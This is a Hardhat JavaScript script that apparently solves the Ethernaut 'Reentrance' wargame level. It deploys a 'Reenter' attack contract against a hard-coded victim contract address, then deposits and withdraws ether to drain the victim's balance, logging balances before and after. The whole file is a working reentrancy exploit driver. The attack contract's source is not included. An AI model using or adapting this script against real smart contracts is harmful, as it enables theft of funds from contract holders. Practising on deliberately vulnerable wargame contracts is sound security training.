
const { ethers, waffle } = require("hardhat");

const CONTRACT_ADDRESS = "0xCdF0E532AB8eb9a12da5Cae3B6aE5370fAACD028"; // get from browser console
const PLAYER_ADDRESS = "0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f"; // change to your own address

async function main() {

    const provider = waffle.provider
    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("Reentrance", CONTRACT_ADDRESS, signer)

    // get current balance
    const balance = await provider.getBalance(CONTRACT_ADDRESS)
    console.log(`balance of victim contract is ${ethers.utils.formatEther(balance)}`)


    // deploy attack contract
    const ReenterFacory = await ethers.getContractFactory("Reenter")
    const reenter = await ReenterFacory.deploy(CONTRACT_ADDRESS)
    await reenter.deployed()
    console.log(`attack Address : ${reenter.address}`)

    const balance1 = await reenter.balance()
    console.log(`balance of attack contract is ${ethers.utils.formatEther(balance1)}`)


    // send some ether to the contract from attack contract
    await reenter.donateAndWithdraw({ value: ethers.utils.parseEther('0.002') })
    const balance2 = await provider.getBalance(CONTRACT_ADDRESS)
    console.log(`balance of victim contract after deposit and withdraw is ${ethers.utils.formatEther(balance2)}`)

    const balance3 = await reenter.balance()
    console.log(`balance of attack contract after withdraw is ${ethers.utils.formatEther(balance3)}`)

}

main().catch((error) => {
    console.error(error);
    // eslint-disable-next-line no-process-exit
    process.exit(1);

});